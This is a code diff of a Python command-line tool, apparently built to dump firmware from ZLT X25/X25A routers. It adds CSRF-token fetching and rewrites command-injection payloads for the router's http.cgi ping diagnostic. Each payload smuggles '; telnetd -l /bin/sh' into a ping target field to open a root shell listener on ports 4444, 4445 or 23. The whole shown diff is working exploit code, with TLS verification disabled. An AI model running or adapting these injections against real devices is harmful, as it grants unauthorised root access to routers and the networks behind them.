@@ -824,69 +824,100 @@ class ZLTFirmwareDumperCLI:
                     logger.error("Re-auth failed: %s", err)
                     console.print(f"  [red]✘  Re-auth failed: {err}[/red]")
 
-    def _get_httpcgi_injection_vectors(self):
-        """X25 / X25A  (yocto_orca)  —  JSON ping diagnostic injection.
-        
-        Multiple cmd numbers tried because different X25 firmware revisions
-        use different diagnostic command IDs:
-          cmd 172 subcmd 6 = WAN ping diagnostic (common)
-          cmd 5   subcmd 1 = Network test (some builds)
-          cmd 113          = System diagnostic (alternate)
+    def _fetch_csrf_token(self) -> str:
         """
+        Fetch the CSRF token the X25 firmware requires with cmd:168 POST.
+        The token is returned by a cmd:113 GET before starting a ping.
+        Returns empty string if fetch fails — injection still attempted without it.
+        """
+        url = f"{self.proto}://{self.router_ip}/cgi-bin/http.cgi"
+        payload = {
+            "cmd": 113,
+            "method": "GET",
+            "language": "en",
+            "sessionId": self.session_id,
+        }
+        headers = {
+            "Content-Type":     "application/json",
+            "X-Requested-With": "XMLHttpRequest",
+            "Origin":           f"{self.proto}://{self.router_ip}",
+            "Referer":          f"{self.proto}://{self.router_ip}/index.html",
+            "Cookie":           f"sessionId={self.session_id}",
+            "User-Agent":       "Mozilla/5.0",
+        }
+        try:
+            ctx = ssl._create_unverified_context() if self.proto == "https" else None
+            req = urllib.request.Request(
+                url, data=json.dumps(payload).encode(), headers=headers, method="POST"
+            )
+            with urllib.request.urlopen(req, timeout=6.0, context=ctx) as resp:
+                body = resp.read().decode("utf-8", errors="ignore")
+                logger.debug("cmd:113 token fetch response: %s", body[:300])
+                # Token appears as "token":"<hex>" in the response
+                m = re.search(r'"token"\s*:\s*"([0-9a-fA-F]{16,})"', body)
+                if m:
+                    logger.info("CSRF token fetched: %s", m.group(1))
+                    return m.group(1)
+        except Exception as exc:
+            logger.debug("CSRF token fetch failed: %s", exc)
+        return ""
+
+    def _get_httpcgi_injection_vectors(self):
+        """
+        X25 / X25A (yocto_orca) — ping diagnostic injection.
+
+        Confirmed payload from browser capture:
+          cmd:168  method:POST  subcmd:0
+          field: "url"  (not "ip")
+          field: "token" (CSRF token from prior cmd:113 GET)
+          field: "pingTimes": 20
+        """
+        # Fetch CSRF token first — required by this firmware
+        token = self._fetch_csrf_token()
+        logger.info("Using CSRF token: %r", token)
+
         vectors = []
-        
-        # Standard ping diagnostic (cmd 172 subcmd 6)
         for shell, port in [("/bin/sh", 4444), ("/bin/ash", 4445)]:
+            # Primary: cmd 168 with token (confirmed format)
             vectors.append((
-                f"http.cgi cmd:172 inject {shell} → :{port}", port, {
-                    "enabled": "1",
-                    "ip": f"127.0.0.1 ; telnetd -l {shell} -p {port}",
-                    "cmd": 172,
-                    "method": "POST",
-                    "subcmd": 6,
-                    "language": "EN",
+                f"http.cgi cmd:168 inject {shell} → :{port}", port, {
+                    "cmd":       168,
+                    "method":    "POST",
+                    "subcmd":    0,
+                    "pingTimes": 20,
+                    "url":       f"127.0.0.1 ; telnetd -l {shell} -p {port}",
+                    "token":     token,
+                    "language":  "en",
                     "sessionId": self.session_id,
                 }
             ))
-        
-        # Alternative: cmd 5 (network tools on some X25 builds)
+            # Fallback: same payload without token (in case token not needed)
+            vectors.append((
+                f"http.cgi cmd:168 no-token inject {shell} → :{port}", port, {
+                    "cmd":       168,
+                    "method":    "POST",
+                    "subcmd":    0,
+                    "pingTimes": 20,
+                    "url":       f"127.0.0.1 ; telnetd -l {shell} -p {port}",
+                    "language":  "en",
+                    "sessionId": self.session_id,
+                }
+            ))
+
+        # cmd:168 on port 23 (standard telnetd, no explicit port flag)
         vectors.append((
-            "http.cgi cmd:5 inject → :4444", 4444, {
-                "cmd": 5,
-                "method": "POST",
-                "subcmd": 1,
-                "language": "EN",
-                "testType": "ping",
-                "ipAddress": "127.0.0.1 ; telnetd -l /bin/sh -p 4444",
+            "http.cgi cmd:168 telnetd → :23", 23, {
+                "cmd":       168,
+                "method":    "POST",
+                "subcmd":    0,
+                "pingTimes": 1,
+                "url":       f"127.0.0.1 ; telnetd -l /bin/sh",
+                "token":     token,
+                "language":  "en",
                 "sessionId": self.session_id,
             }
         ))
-        
-        # Alternative: cmd 113 (system diagnostics)
-        vectors.append((
-            "http.cgi cmd:113 inject → :4445", 4445, {
-                "cmd": 113,
-                "method": "POST",
-                "action": "ping",
-                "target": "127.0.0.1 ; telnetd -l /bin/sh -p 4445",
-                "language": "EN",
-                "sessionId": self.session_id,
-            }
-        ))
-        
-        # Standard telnetd on :23
-        vectors.append((
-            "http.cgi cmd:172 telnetd → :23", 23, {
-                "enabled": "1",
-                "ip": f"{self.router_ip} ; telnetd -l /bin/sh",
-                "cmd": 172,
-                "method": "POST",
-                "subcmd": 6,
-                "language": "EN",
-                "sessionId": self.session_id,
-            }
-        ))
-        
+
         return vectors
 
     def _get_goform_injection_vectors(self):
